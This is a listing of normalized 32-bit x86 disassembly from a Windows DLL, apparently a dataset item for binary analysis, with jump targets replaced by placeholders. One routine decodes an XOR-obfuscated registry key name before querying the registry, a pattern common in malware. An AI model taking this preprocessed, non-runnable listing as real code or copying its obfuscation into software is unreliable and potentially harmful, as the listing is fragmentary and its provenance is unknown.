mov ecx [ ebp - 0x4c ]
mov edx [ ecx + edi * 4 ]
mov ebx [ ebp - 0x58 ]
lea eax [ edx + ebx * 2 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov ebx [ ebp - 0x5c ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jne r-xdata
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x50 ] edi
mov ecx [ ebp - 0x50 ]
mov eax [ eax + ecx * 4 ]
lea edi [ ebx + ebx ]
add eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ GetProcessHeap@IAT ]
sub eax edx
sar eax 0x1
lea edx [ eax + eax + 0x2 ]
push edx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x50 ]
mov esi eax
mov eax [ ebp - 0x4c ]
mov ecx [ eax + ecx * 4 ]
add ecx edi
mov eax ecx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
add eax eax
push eax
push ecx
push esi
call sub_10078600
mov ecx [ ebp - 0x4c ]
add esp 0xc
push ecx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_1001c9f0
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
lea ebx [ esi + 0x5c ]
push r--data
xor edi edi
mov ecx ebx
call sub_1005e510
mov edi 0x8
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
cmp [ ebx + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
mov ebx [ ebx ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc4 ]
call eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ esi + 0xc4 ]
push 0x0
push 0x0
push ebx
push 0x3
push eax
call ecx
mov eax [ eax ]
mov ecx eax
mov [ esi + 0xb8 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] edi
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x1 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xbc ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
pop edi
pop ebx
xor eax eax
pop esi
retn
mov ecx [ esi + 0xb8 ]
mov edx [ esi + 0xd4 ]
push ecx
call edx
pop edi
pop ebx
mov [ esi + 0xb8 ] 0x0
mov eax 0x2
pop esi
retn
sub_1001cac0
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_1002f22b
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_1001caf0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_100539e5
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_100382f1
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10016231
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_1001a5b4
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_1000a03a
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1001cc00
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x9b
dec eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ esi ] eax
mov eax [ ecx + 0x1c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x70
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_1000a6f0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1001cc80
push ebp
mov ebp esp
push 0xffffffff
push sub_100826a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x46c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x470 ] eax
mov eax [ esi + 0x10 ]
lea edx [ eax + eax ]
push edx
push 0x8
mov [ ebp - 0x474 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x90 ]
call sub_1005e3c0
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x70 ] esi
lea ecx [ ebp - 0x90 ]
mov edi ebx
mov [ ebp - 0x4 ] 0x0
call sub_1003e740
lea esi [ ebp - 0x46c ]
call sub_10015620
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10038f10
test eax eax
je r-xdata
add ecx ecx
push ecx
push eax
push edi
call sub_10078600
mov esi [ esi + 0x10 ]
add esp 0xc
lea edx [ ebp - 0x28 ]
mov eax 0x114
add esi esi
call sub_1001bb80
xor edx edx
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x90 ] dx
mov [ ebp - 0x7c ] 0x7
mov [ ebp - 0x80 ] 0x0
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov eax [ ebp - 0x468 ]
mov ecx [ ebp - 0x470 ]
mov edx [ ebp - 0x464 ]
mov edi [ ebp - 0x474 ]
mov [ ecx ] eax
mov [ edi ] edx
call sub_1002d790
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x15a
call sub_1001bb80
mov ecx esi
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_10031010
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
lea edx [ ebp - 0x46c ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10031010
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x12f
call sub_1001bb80
lea eax [ ebp - 0x46c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10031010
cmp [ ebp - 0x7c ] 0x8
jb r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x90 ]
push edx
call sub_10065045
add esp 0x4
xor eax eax
mov eax [ ebp - 0x90 ]
push eax
call sub_10065045
add esp 0x4
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_10065045
add esp 0x4
sub_1001ce60
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_1005927e
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1001ce90
push ebp
mov ebp esp
push 0xffffffff
push sub_100811d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor ebx ebx
lea ecx [ ebp - 0x26c ]
push ebx
push ecx
mov [ ebp - 0x284 ] eax
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x26c ]
call sub_10044b20
cmp eax ebx
je r-xdata
push 0x144
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
lea eax [ ebx + 0x72 ]
call sub_1001bb80
lea eax [ ebx + 0x1 ]
jmp r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x270 ]
call sub_1001e330
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x274 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x278 ] ebx
mov [ ebp - 0x274 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x278 ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp - 0x26c ]
push ecx
lea esi [ ebp - 0x278 ]
mov [ ebp - 0x270 ] ebx
call sub_10031da0
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x74
call sub_1001bb80
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ebx [ ebp - 0x278 ]
call sub_10007e40
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xd2
call sub_1001bb80
mov [ ebp - 0x270 ] 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
lea eax [ ebx + 0x12c ]
mov ebx [ ebp - 0x284 ]
call sub_10044af0
mov edi eax
mov esi [ edi ]
test esi esi
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xcf
call sub_1001bb80
mov [ ebp - 0x270 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x27c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x157
call sub_1001bb80
mov [ ebp - 0x270 ] 0xa
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
call sub_10012830
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x9f
call sub_1001bb80
mov [ ebp - 0x270 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x278 ]
call sub_1000d0b0
test eax eax
je r-xdata
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax [ ebp - 0x270 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov esi eax
call sub_10017e80
jmp r-xdata
lea edi [ ebp - 0x280 ]
lea ecx [ ebp - 0x27c ]
call sub_1002d790
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x1a
call sub_1001bb80
mov [ ebp - 0x270 ] 0x7
jmp r-xdata
mov ebx [ ebp - 0x278 ]
mov [ edi ] eax
xor eax eax
lea edx [ ebp - 0x27c ]
push edx
lea ecx [ ebp - 0x280 ]
mov [ ebp - 0x27c ] eax
mov [ ebp - 0x280 ] eax
call sub_10021b00
test eax eax
je r-xdata
mov eax [ ebp - 0x280 ]
mov ecx [ ebp - 0x27c ]
push eax
push ecx
lea eax [ ebp - 0x26c ]
call sub_1000c170
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x12f
call sub_1001bb80
mov [ ebp - 0x270 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xaa
call sub_1001bb80
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x9
jmp r-xdata
sub_1001d1d0
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
push edi
lea esp [ esp ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0xffdb
and edi 0xff
mov [ ebp + eax * 2 - 0x58 ] di
inc eax
cmp eax 0x28
jb r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
xor eax eax
push 0x1
push eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x58 ]
push eax
push edx
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edi [ GetProcessHeap@IAT ]
push 0x206
push 0x8
mov [ esi ] 0x206
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x5c ]
push esi
push eax
push 0x0
push 0x0
push r--data
push ecx
mov [ ebx ] eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
push edx
push 0x0
call edi
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x5c ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001d2e0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x10 ] edx
call sub_10026143
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x10 ]
dec esi
sub ecx eax
cmp ecx esi
jge r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x10
test esi esi
jle r-xdata
mov edx [ ebp - 0x10 ]
pop edi
pop esi
mov [ ebx ] edx
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x10
push esi
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_10078600
add esp 0xc
add [ edi ] esi
sub_1001d386
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10010e0d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000a135
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1001d440
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_1003fac0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_1005b660
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1001d4e2
push 0x194
mov eax sub_1007ea3f
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10015a9a
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_1001b8c7
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002a730
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10007cf0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1002a6b0
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10024aa0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10024aa0
mov eax [ ebp - 0x188 ]
call sub_10019c00
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1004737b
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002a730
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10020962
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1005805f
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_10039e87
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_1005e05a
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1002a674
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_1001e1bc
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_10039e87
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10007cf0
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10024aa0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10024aa0
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1001e1ec
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_100171f8
or [ ebp - 0x168 ] 0x4
